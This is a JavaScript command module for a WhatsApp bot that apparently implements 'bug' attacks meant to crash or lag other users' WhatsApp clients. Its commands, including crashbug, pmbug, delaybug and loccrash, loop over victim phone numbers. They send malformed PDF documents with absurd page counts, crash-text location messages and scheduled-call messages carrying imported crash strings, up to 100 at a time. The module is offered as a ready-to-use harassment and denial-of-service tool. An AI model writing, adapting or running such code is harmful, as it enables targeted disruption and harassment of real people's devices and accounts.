const { zokou } = require("../framework/zokou");
const { delay, loading, react } = require("../framework/utils");
const moment = require("moment-timezone");
const conf = require("../set.js");
const fs = require("fs");
const path = require("path");
const {
    generateWAMessageFromContent,
    proto
} = require("@whiskeysockets/baileys");

// bug database
const { bugtext1 } = require("../framework/bugs/bugtext1");
const { bugtext2 } = require("../framework/bugs/bugtext2");
const { bugtext3 } = require("../framework/bugs/bugtext3");
const { bugtext4 } = require("../framework/bugs/bugtext4");
const { bugtext5 } = require("../framework/bugs/bugtext5");
const { bugtext6 } = require("../framework/bugs/bugtext6");
const { bugpdf } = require("../framework/bugs/bugpdf.js");

const category = "menu";
const reaction = "🛡️";

const mess = {};
mess.prem = "You are not authorised to use this command !!!";

const phoneRegex = /^[0-9]+$/;
const whatsappRegex = /https:\/\/chat\.whatsapp\.com\/(invite|join|)[A-Za-z0-9]+/;

const timewisher = (time) => {
    if (time < "05:00:00") {
        return `Good Morning 🌄`;
    } else if (time < "11:00:00") {
        return `Good Morning 🏞️`;
    } else if (time < "15:00:00") {
        return `Good Afternoon 🌅`;
    } else if (time < "18:00:00") {
        return `Good Evening 🌆`;
    } else if (time < "19:00:00") {
        return `Good Evening 🌆`;
    } else {
        return `Good Night 🌃`;
    }
};

async function relaybug(dest, zk, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        const victimNumber = victims[i].replace(/[^0-9]/g, '');
        
        if (!phoneRegex.test(victimNumber)) {
            repondre(`${victims[i]} not a valid phone number`);
            continue;
        }
        
        const victim = victimNumber + "@s.whatsapp.net";
        
        for (let j = 0; j < amount; j++) {
            try {
                var scheduledCallCreationMessage = generateWAMessageFromContent(
                    dest,
                    proto.Message.fromObject(bug),
                    { userJid: dest, quoted: ms }
                );
                
                await zk.relayMessage(
                    victim,
                    scheduledCallCreationMessage.message,
                    { messageId: scheduledCallCreationMessage.key.id }
                );
                
                await delay(2000);
            } catch (e) {
                repondre(`An error occurred while sending bugs to ${victims[i]}`);
                console.log(`An error occurred while sending bugs to ${victim}: ${e}`);
                break;
            }
        }
        
        if (victims.length > 1) {
            repondre(`${amount} bugs sent to ${victims[i]} Successfully.`);
        }
        await delay(3000);
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}

async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        const victimNumber = victims[i].replace(/[^0-9]/g, '');
        
        if (!phoneRegex.test(victimNumber)) {
            repondre(`${victims[i]} not a valid phone number`);
            continue;
        }
        
        const victim = victimNumber + "@s.whatsapp.net";
        
        for (let j = 0; j < amount; j++) {
            try {
                await zk.sendMessage(victim, bug);
                await delay(2000);
            } catch (e) {
                repondre(`An error occurred while sending bugs to ${victims[i]}`);
                console.log(`An error occurred while sending bugs to ${victim}: ${e}`);
                break;
            }
        }
        
        if (victims.length > 1) {
            repondre(`${amount} bugs sent to ${victims[i]} Successfully.`);
        }
        await delay(3000);
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}

// --cmds--

// bug menu
zokou(
    {
        nomCom: "cbugs",
        categorie: "menu",
        reaction: "😈",
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre } = commandOptions;
        const mono = "```";
        const time = moment().tz(conf.TZ).format("HH:mm:ss");
        
        let menuImage;
        try {
            menuImage = fs.readFileSync(
                path.resolve(__dirname, "..", "media", "deleted-message.jpg")
            );
        } catch (e) {
            console.log("Menu image not found, using default");
            menuImage = null;
        }
        
        const tumbUrl = "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg";
        
        let menu = `${mono}Hello ${ms.pushName || "User"}
${timewisher(time)}

≡ 𝙱𝚄𝙶 𝙼𝙴𝙽𝚄 ≡

📌 INDIVIDUAL BUGS:
• bug
• crash
• loccrash
• amountbug <amount>
• crashbug <amount> | <numbers>
• pmbug <amount> | <numbers>
• delaybug <amount> | <numbers>
• trollybug <amount> | <numbers>
• docubug <amount> | <numbers>
• unlimitedbug <amount> | <numbers>
• bombug <amount> | <numbers>
• lagbug <amount> | <numbers>

📌 GROUP BUGS:
• gcbug <grouplink>
• delaygcbug <grouplink>
• trollygcbug <grouplink>
• laggcbug <grouplink>
• bomgcbug <grouplink>
• unlimitedgcbug <grouplink>
• docugcbug <grouplink>

⚠️ Use with caution!${mono}`;

        try {
            await zk.sendMessage(
                dest,
                {
                    image: menuImage || { url: tumbUrl },
                    caption: menu,
                    contextInfo: {
                        mentionedJid: [ms.key.remoteJid],
                        forwardingScore: 999,
                        isForwarded: true,
                        externalAdReply: {
                            title: `${conf.BOT || "Bug Bot"}`,
                            body: `Bot Created By ${conf.OWNER_NAME || "Owner"}`,
                            thumbnailUrl: tumbUrl,
                            sourceUrl: "https://whatsapp.com/channel/0029VatokI45EjxufALmY32X",
                            mediaType: 1
                        }
                    }
                },
                { quoted: ms }
            );
        } catch (e) {
            console.log("Error sending menu:", e);
            repondre("Error displaying menu");
        }
    }
);

// bug
zokou(
    {
        nomCom: "bug",
        categorie: "menu",
        reaction: "🛡️",
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        
        if (!superUser) return await repondre(mess.prem);

        await loading(dest, zk);

        try {
            for (let i = 0; i < 25; i++) {
                const doc = { url: "./set.js" };
                await zk.sendMessage(dest, {
                    document: doc,
                    mimetype: "application/pdf",
                    title: "BUG_FILE.pdf",
                    pageCount: 9999999999,
                    fileName: "BUG_FILE.pdf\n\n" + (bugpdf || "Bug content here")
                });
                await delay(1000);
            }
            await zk.sendMessage(dest, { react: { text: "😈", key: ms.key } });
        } catch (e) {
            console.log("Error in bug command:", e);
            repondre("An error occurred");
        }
    }
);

// crash
zokou(
    {
        nomCom: "crash",
        categorie: "menu",
        reaction: "🛡️",
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        
        if (!superUser) return await repondre(mess.prem);
        
        await loading(dest, zk);
        
        try {
            for (let i = 0; i < 10; i++) {
                await zk.sendMessage(dest, { text: bugtext6 || "Bug text here" });
                await delay(500);
            }
        } catch (e) {
            console.log("Error in crash command:", e);
            repondre("An error occurred sending bugs");
        }
    }
);

// loccrash
zokou(
    {
        nomCom: "loccrash",
        reaction: "🛡️",
        categorie: "menu",
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        
        if (!superUser) return await repondre(mess.prem);
        
        await loading(dest, zk);

        try {
            for (let i = 0; i < 20; i++) {
                await zk.sendMessage(
                    dest,
                    {
                        location: {
                            degreesLatitude: -6.28282828,
                            degreesLongitude: -1.2828,
                            name: "CRASH LOCATION\n".repeat(10)
                        }
                    },
                    { quoted: ms }
                );
                await delay(500);
            }
            await zk.sendMessage(dest, { react: { text: "🛡️", key: ms.key } });
        } catch (e) {
            console.log("Error in loccrash command:", e);
            repondre("An error occurred");
        }
    }
);

// crashbug
zokou(
    {
        nomCom: "crashbug",
        categorie: "menu",
        reaction: "🛡️"
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        
        if (!superUser) return await repondre(mess.prem);
        
        if (!arg[0]) {
            return await repondre(
                `Use ${prefixe}crashbug amount | numbers\n` +
                `Example: ${prefixe}crashbug 30 | ${conf.NUMERO_OWNER || "254700000000"}`
            );
        }

        await loading(dest, zk);
        
        const text = arg.join(" ");
        let amount = 30;
        let victims = [];
        
        const bug = {
            document: { url: "./set.js" },
            mimetype: "application/pdf",
            title: "CRASH_BUG.pdf",
            pageCount: 9999999999,
            fileName: "CRASH_BUG.pdf\n\n" + (bugpdf || "Bug content here")
        };

        if (arg.length === 1) {
            // Single victim
            victims.push(arg[0]);
            await repondre(`Sending ${amount} bugs to ${victims[0]}`);
            
            try {
                await sendbug(dest, zk, ms, repondre, amount, victims, bug);
            } catch (e) {
                console.log("Error in crashbug:", e);
                await repondre("An error occurred");
                await react(dest, zk, ms, "⚠️");
            }
        } else {
            // Multiple victims with amount
            if (text.includes("|")) {
                amount = parseInt(text.split("|")[0].trim());
                
                if (isNaN(amount) || amount < 1 || amount > (conf.BOOM_MESSAGE_LIMIT || 100)) {
                    return await repondre(
                        `Amount must be between 1-${conf.BOOM_MESSAGE_LIMIT || 100}`
                    );
                }
                
                victims = text.split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                
                if (victims.length > 0) {
                    await repondre(`Sending ${amount} bugs to ${victims.join(", ")}`);
                    
                    try {
                        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
                    } catch (e) {
                        console.log("Error in crashbug:", e);
                        await repondre("An error occurred");
                        await react(dest, zk, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specified");
                }
            } else {
                return await repondre("Invalid format. Use: amount | numbers");
            }
        }
        
        await react(dest, zk, ms, "🛡️");
    }
);

// amountbug
zokou(
    {
        nomCom: "amountbug",
        categorie: "menu",
        reaction: "🛡️",
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;

        if (!superUser) return await repondre(mess.prem);
        
        if (!arg[0]) {
            return await repondre(
                `Use ${prefixe}amountbug amount\n` +
                `Example: ${prefixe}amountbug 5`
            );
        }

        const amount = parseInt(arg[0]);
        const maxAmount = conf.BOOM_MESSAGE_LIMIT || 100;
        
        if (isNaN(amount) || amount > maxAmount || amount < 1) {
            return await repondre(
                `Use a valid number between 1-${maxAmount}`
            );
        }

        await loading(dest, zk);

        try {
            for (let i = 0; i < amount; i++) {
                const bug = bugtext1 || "Bug message here";
                
                var scheduledCallCreationMessage = generateWAMessageFromContent(
                    dest,
                    proto.Message.fromObject({
                        scheduledCallCreationMessage: {
                            callType: "2",
                            scheduledTimestampMs: Date.now().toString(),
                            title: bug
                        }
                    }),
                    { userJid: dest, quoted: ms }
                );
                
                await zk.relayMessage(
                    dest,
                    scheduledCallCreationMessage.message,
                    { messageId: scheduledCallCreationMessage.key.id }
                );
                
                await delay(2000);
            }
            
            await repondre(
                `✅ Successfully sent ${amount} bugs. Please wait 3 minutes before next use.`
            );
            await react(dest, zk, ms, "🛡️");
        } catch (e) {
            console.log("Error in amountbug:", e);
            await repondre("An error occurred while sending bugs");
        }
    }
);

// pmbug
zokou(
    {
        nomCom: "pmbug",
        categorie: "menu",
        reaction: "🛡️",
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        
        if (!superUser) return await repondre(mess.prem);
        
        if (!arg[0]) {
            return await repondre(
                `Use ${prefixe}pmbug amount | numbers\n` +
                `Example: ${prefixe}pmbug 30 | ${conf.NUMERO_OWNER || "254700000000"}`
            );
        }

        await loading(dest, zk);
        
        const text = arg.join(" ");
        let amount = 30;
        let victims = [];
        
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: Date.now().toString(),
                title: bugtext1 || "Bug message here"
            }
        };

        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`Sending ${amount} bugs to ${victims[0]}`);
            
            try {
                await relaybug(dest, zk, ms, repondre, amount, victims, bug);
            } catch (e) {
                console.log("Error in pmbug:", e);
                await repondre("An error occurred");
                await react(dest, zk, ms, "⚠️");
            }
        } else {
            if (text.includes("|")) {
                amount = parseInt(text.split("|")[0].trim());
                const maxAmount = conf.BOOM_MESSAGE_LIMIT || 100;
                
                if (isNaN(amount) || amount < 1 || amount > maxAmount) {
                    return await repondre(
                        `Amount must be between 1-${maxAmount}`
                    );
                }
                
                victims = text.split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                
                if (victims.length > 0) {
                    await repondre(`Sending ${amount} bugs to ${victims.join(", ")}`);
                    
                    try {
                        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
                    } catch (e) {
                        console.log("Error in pmbug:", e);
                        await repondre("An error occurred");
                        await react(dest, zk, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specified");
                }
            } else {
                return await repondre("Invalid format. Use: amount | numbers");
            }
        }
        
        await react(dest, zk, ms, "🛡️");
    }
);

// delaybug
zokou(
    {
        nomCom: "delaybug",
        categorie: "menu",
        reaction: "🕷️",
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        
        if (!superUser) return await repondre(mess.prem);
        
        if (!arg[0]) {
            return await repondre(
                `Use ${prefixe}delaybug amount | numbers\n` +
                `Example: ${prefixe}delaybug 30 | ${conf.NUMERO_OWNER || "254700000000"}`
            );
        }

        await loading(dest, zk);
        
        const text = arg.join(" ");
        let amount = 30;
        let victims = [];
        
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: Date.now().toString(),
                title: bugtext2 || "Delay bug message"
            }
        };

        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`Sending ${amount} delay bugs to ${victims[0]}`);
            
            try {
                await relaybug(dest, zk, ms, repondre, amount, victims, bug);
            } catch (e) {
                console.log("Error in delaybug:", e);
                await repondre("An error occurred");
                await react(dest, zk, ms, "⚠️");
            }
        } else {
            if (text.includes("|")) {
                amount = parseInt(text.split("|")[0].trim());
                const maxAmount = conf.BOOM_MESSAGE_LIMIT || 100;
                
                if (isNaN(amount) || amount < 1 || amount > maxAmount) {
                    return await repondre(
                        `Amount must be between 1-${maxAmount}`
                    );
                }
                
                victims = text.split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                
                if (victims.length > 0) {
                    await repondre(`Sending ${amount} delay bugs to ${victims.join(", ")}`);
                    
                    try {
                        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
                    } catch (e) {
                        console.log("Error in delaybug:", e);
                        await repondre("An error occurred");
                        await react(dest, zk, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specified");
                }
            } else {
                return await repondre("Invalid format. Use: amount | numbers");
            }
        }
        
        await react(dest, zk, ms, "🕷️");
    }
);

console.log("Bug commands loaded successfully");
